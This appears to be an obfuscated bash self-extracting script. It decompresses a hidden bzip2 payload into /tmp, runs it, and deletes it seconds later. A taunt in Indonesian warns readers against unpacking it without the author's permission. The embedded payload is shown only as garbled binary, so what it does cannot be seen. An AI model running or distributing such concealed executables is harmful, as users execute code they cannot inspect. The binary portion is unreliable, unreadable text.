#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY"�� p����� }���?������@�Dऀ0  @ P�w��������$�<j=ML���=54�C��@�A��i�S��~�~��1@Ɔ�4 4      �  �""&�~����z��=C�S#Й= ��MG�!�hɀڕ�M i�4h M �@4�4ѡ� ��&��52i�x�6�C�4� 4m@�jPh eJ|�wx��h�p.$DpܒLpU�g������s� 3=�nn������4�` ��g�X�rH&n��|�����Y� R��-�n�3���c�Nd���p ��q���8�@�2�/������bB��F2��S��	�B�ߗ��Şb~J�t�k\��{�o٘ógyz���0��u��J��tk�����Ќ�yJ����ZZ0-�0�oβEf�ӕ�͕+��t^i�MJAƄx"����Z�����ܧF�6���P�� �6؛Blb��o�k��_0�%ϵ�Viom�]���`
ڡ� 5��ڔH��F�I�$��:�lYhI�8`�0�`�����[hO������|���l��J4sO��R�I;@3�)M���׍7�}��r��>j��y�%��2N���J1�l�eb���}Ei���Y����I	�-`+2&�O3�R@�辚b��ħ��hd���BP��2B�c��BLV�2�ǵ��R�G{�6ڀ i�F���"�BbS�X	/IEA4��fx���z��T�ݙR'�	%� �ԕ�R�0�QJ!o����$�픻�
`W�K2�(��"��^N�P�����g��T�ߊ.�Q�*%�GL�;;K,�SN=�J#R��ƽ�6����I0�4ҋ�R�'!,�I��%A�./:���4I3��M�X��������I��X�Z��%v�\���p�Wf���*V:��wyG:�b^�f�=��ʔA/�(��U� ��m �I�Ǔ!pL�d$��<Ϲ��OM���嗘L�0�̙���s���J , Ǌ�f3[�;��%����%U���܇ޱ��גF�h�(.�ڮv����vƎ�
TŻ�Rv�s��J��M�	L�nڜԀt�i[�zCͅ��䟵�v* ۺc��$�Dܼz�I,�%��2��+]2c&�W*���3�E0o�U@���3ʬX8;s8SS�o�� ��ODj2��ZN@�@�����U�⸴��Q�~���IߣJ�B���7\�ky��7ڦk�%�PKh�W3�o��1�D�s�7��ה�XCyBKj�0Ѭ������|�?Z�u�ipV@J����� �J��H��pB|�H�	d"�� �O���/W-���q�p�<]+��W좻�I���p͝c!�a�2�ج4^��
|�C�>�1z�RW�H8 :�����AƐ����HP�@/Y� 1$�/j� `2:��_�2d�cx��<d<d^� J 
��mi��{�ܑN$����